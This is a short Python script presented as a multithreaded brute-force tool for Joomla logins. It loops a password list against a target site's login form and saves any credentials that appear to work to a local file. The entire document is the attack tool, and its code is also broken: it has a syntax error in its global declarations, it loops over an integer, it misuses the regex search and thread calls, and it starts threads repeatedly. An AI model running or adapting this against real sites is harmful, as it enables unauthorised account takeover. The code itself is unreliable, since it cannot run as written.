"""
Joomla Multithreaded Bruteforcer
"""
#!/usr/bin/python
import requests
import threading
import sys
import re

Trys = []
global passwords = open('password.txt','r').read().splitlines()
global maxguesses = 0
for i in passwords:
    maxguesses += 1
def Bruteforce(url,username):
    for password in passwords:
        Login = {'username':username,'password':password}
        request = requests.post(url,data=Login)
        if not(re.search('Username and password do not match or you do not have an account yet.',request)):
            savedata = open('bruted_joomla','a')
            savedata.write(url+" Username:"+username+" Password:"+password+"\n")
            savedata.close()
def Crack():
    for guess in maxguesses:
        Trys.append(threading.Thread(target=Bruteforce,args=(url,username)))
        for Verification in Trys:
            while threading.activeCount <= 500:
                Verification.start()
                Verification.join()

if __name__ == "__main__":
    url = sys.argv[2]
    username = sys.argv[1]
    Crack()